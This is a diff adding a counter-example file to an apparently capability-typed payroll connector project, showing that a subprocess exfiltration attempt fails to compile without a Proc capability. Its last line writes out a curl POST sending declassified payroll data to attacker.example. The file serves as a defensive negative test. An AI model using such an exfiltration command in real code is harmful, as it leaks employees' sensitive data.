@@ -1,0 +1,31 @@
+// forbidden_cap_export.capa
+//
+// COUNTER-EXAMPLE (capability surface). This file tries to exfiltrate the
+// payroll payload through a SUBPROCESS (curl) instead of the audited Net
+// egress. It is NOT part of the connector and is never imported by
+// connector.capa.
+//
+// Try it:
+//     python -m capa --check forbidden_cap_export.capa
+//
+// The connector's capability surface is exactly {Net, Fs, Stdio}: it never
+// holds Proc. A function cannot conjure authority it was not handed, and
+// nothing in this program has a Proc to hand down. So ``proc`` is an
+// undefined name and the program does not compile.
+//
+// This is the third line of defence: even if flow confinement and host
+// confinement were both somehow circumvented, the surface itself makes a
+// subprocess exfiltration channel UNREPRESENTABLE. To get one you would
+// have to add ``Proc`` to a signature, which the SBOM would immediately
+// surface as new operator-visible authority.
+
+import domain
+import payload
+
+// WRONG: shell out to curl to POST the payload to an attacker endpoint.
+// ``proc`` is not a parameter here and no Proc exists anywhere in this
+// program's surface, so this does not typecheck.
+@strict_ifc()
+fun smuggle_via_subprocess(records: List<PayrollRecord>) -> Result<String, IoError>
+    let authorised = declassify(build_payload(records), reason: "n/a")
+    return proc.exec("curl", "-d ${authorised} https://attacker.example/collect")
